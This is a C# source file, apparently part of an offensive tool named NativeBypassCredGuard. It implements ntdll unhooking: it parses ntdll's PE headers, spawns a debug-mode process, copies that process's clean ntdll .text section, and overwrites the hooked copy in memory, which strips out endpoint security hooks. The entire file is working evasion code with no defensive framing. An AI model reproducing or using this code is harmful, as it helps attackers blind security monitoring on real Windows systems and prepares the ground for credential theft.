using System;
using System.Runtime.InteropServices;
using static NativeBypassCredGuard.Program;

   
namespace NativeBypassCredGuard
{
    internal class NT
    {
        public const uint DEBUG_PROCESS = 0x00000001;
        public const uint PAGE_EXECUTE_WRITECOPY = 0x80;

        [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

        [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

        [DllImport("ntdll.dll")] public static extern uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength);

        [DllImport("ntdll.dll")] public static extern uint NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("ntdll.dll")] public static extern uint NtClose(IntPtr hObject);

        [DllImport("ntdll.dll")] public static extern uint NtTerminateProcess(IntPtr ProcessHandle, int ExitStatus);

        [DllImport("ntdll.dll")] public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("kernel32.dll")] public static extern bool DebugActiveProcessStop(int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);


        public static int[] GetTextSectionInfo(IntPtr ntdl_address)
        {
            IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;

            // Check MZ Signature
            byte[] data = new byte[2];
            IntPtr signature_addr = ntdl_address;
            NtReadVirtualMemory(hProcess, signature_addr, data, data.Length, out _);
            string signature_dos_header = System.Text.Encoding.Default.GetString(data);
            if (signature_dos_header != "MZ")
            {
                Console.WriteLine("[-] Incorrect DOS header signature");
                Environment.Exit(0);
            }

            // e_lfanew in offset 0x3C in _IMAGE_DOS_HEADER structure, its size is 4 bytes 
            data = new byte[4];
            IntPtr e_lfanew_addr = ntdl_address + 0x3C;
            NtReadVirtualMemory(hProcess, e_lfanew_addr, data, 4, out _);
            int e_lfanew = BitConverter.ToInt32(data, 0);

            // Check PE Signature
            IntPtr image_nt_headers_addr = ntdl_address + e_lfanew;
            data = new byte[2];
            NtReadVirtualMemory(hProcess, image_nt_headers_addr, data, data.Length, out _);
            string signature_nt_header = System.Text.Encoding.Default.GetString(data);
            if (signature_nt_header != "PE")
            {
                Console.WriteLine("[-] Incorrect NT header signature");
                Environment.Exit(0);
            }

            // Check Optional Headers Magic field value
            IntPtr optional_headers_addr = image_nt_headers_addr + 24; // Marshal.SizeOf(typeof(UInt32)) + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) = 24
            data = new byte[4];
            NtReadVirtualMemory(hProcess, optional_headers_addr, data, data.Length, out _);
            int optional_header_magic = BitConverter.ToInt16(data, 0);
            if (optional_header_magic != 0x20B && optional_header_magic != 0x10B)
            {
                Console.WriteLine("[-] Incorrect Optional Header Magic field value");
                Environment.Exit(0);
            }

            // SizeOfCode
            IntPtr sizeofcode_addr = optional_headers_addr + 4; // Uint16 (2 bytes) + Byte (1 byte) + Byte (1 byte) 
            data = new byte[4];
            NtReadVirtualMemory(hProcess, sizeofcode_addr, data, data.Length, out _);
            int sizeofcode = BitConverter.ToInt32(data, 0);

            // BaseOfCode
            IntPtr baseofcode_addr = optional_headers_addr + 20; // Uint16 (2 bytes) + 2 Byte (1 byte) + 4 Uint32 (4 byte) - public UInt16 Magic; public Byte MajorLinkerVersion; public Byte MinorLinkerVersion; public UInt32 SizeOfCode; public UInt32 SizeOfInitializedData; public UInt32 SizeOfUninitializedData; public UInt32 AddressOfEntryPoint; public UInt32 BaseOfCode;
            data = new byte[4];
            NtReadVirtualMemory(hProcess, baseofcode_addr, data, data.Length, out _);
            int baseofcode = BitConverter.ToInt32(data, 0);

            int[] result = { baseofcode, sizeofcode };
            return result;
        }



        // Create debug process, map its ntdl.dll .text section and copy it to a new buffer, return the buffer address
        public unsafe static IntPtr GetNtdllFromDebugProc(string process_path)
        {
            // CreateProcess in DEBUG mode
            STARTUPINFO si = new STARTUPINFO();
            si.cb = System.Runtime.InteropServices.Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool createprocess_res = CreateProcess(process_path, null, IntPtr.Zero, IntPtr.Zero, false, DEBUG_PROCESS, IntPtr.Zero, null, ref si, out pi);
            if (!createprocess_res)
            {
                Console.WriteLine("[-] Error calling CreateProcess");
                Environment.Exit(0);
            }

            // Ntdll .Text Section Address and Size from local process
            IntPtr currentProcess = (IntPtr)(-1);
            IntPtr localNtdllHandle = CustomGetModuleHandle(currentProcess, "ntdll.dll");
            int[] result = GetTextSectionInfo(localNtdllHandle);
            int localNtdllTxtBase = result[0];
            int localNtdllTxtSize = result[1];
            IntPtr localNtdllTxt = localNtdllHandle + localNtdllTxtBase;

            // NtReadVirtualMemory to copy the bytes from ntdll.dll in the suspended process into a new buffer (ntdllBuffer)
            // debugged_process ntdll_handle = local ntdll_handle --> debugged_process .text section ntdll_handle = local .text section ntdll_handle
            byte[] ntdllBuffer = new byte[localNtdllTxtSize];
            uint readprocmem_res = NtReadVirtualMemory(pi.hProcess, localNtdllTxt, ntdllBuffer, ntdllBuffer.Length, out _);
            if (readprocmem_res != 0)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory");
                Environment.Exit(0);
            }

            // Get pointer to the buffer containing ntdll.dll
            IntPtr pNtdllBuffer = IntPtr.Zero;
            fixed (byte* p = ntdllBuffer)
            {
                pNtdllBuffer = (IntPtr)p;
            }

            // Terminate and close handles in debug process
            bool debugstop_res = DebugActiveProcessStop(pi.dwProcessId);
            uint terminateproc_res = NtTerminateProcess(pi.hProcess, 0);
            if (debugstop_res != true)
            {
                Console.WriteLine("[-] Error calling DebugActiveProcessStop");
                Environment.Exit(0);
            }
            if (terminateproc_res != 0)
            {
                Console.WriteLine("[-] Error calling NtTerminateProcess. NTSTATUS:" + terminateproc_res.ToString("X"));
                Environment.Exit(0);
            }
            uint closehandle_proc = NtClose(pi.hProcess);
            uint closehandle_thread = NtClose(pi.hThread);
            if (closehandle_proc != 0 || closehandle_thread != 0)
            {
                Console.WriteLine("[-] Error calling CloseHandle");
                Environment.Exit(0);
            }

            return pNtdllBuffer;
        }


        // Overwrite hooked ntdll .text section with a clean version
        public static void ReplaceNtdllTxtSection(IntPtr unhookedNtdllTxt, IntPtr localNtdllTxt, int localNtdllTxtSize)
        {
            // VirtualProtect to PAGE_EXECUTE_WRITECOPY
            uint dwOldProtection;
            IntPtr currentProcess = (IntPtr)(-1);
            uint localNtdllTxtSizeUint = (uint)localNtdllTxtSize;
            uint vp_res = NtProtectVirtualMemory(currentProcess, ref localNtdllTxt, ref localNtdllTxtSizeUint, PAGE_EXECUTE_WRITECOPY, out dwOldProtection);
            if (vp_res != 0)
            {
                Console.WriteLine("[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY)");
                Environment.Exit(0);
            }

            // Copy from one address to the other
            unsafe
            {
                Buffer.MemoryCopy((void*)unhookedNtdllTxt, (void*)localNtdllTxt, localNtdllTxtSize, localNtdllTxtSize);
            }

            // VirtualProtect back to PAGE_EXECUTE_READ
            uint vp_res2 = NtProtectVirtualMemory(currentProcess, ref localNtdllTxt, ref localNtdllTxtSizeUint, dwOldProtection, out dwOldProtection);
            if (vp_res2 != 0)
            {
                Console.WriteLine("[-] Error calling NtProtectVirtualMemory (dwOldProtection)");
                Environment.Exit(0);
            }
        }
    }
}
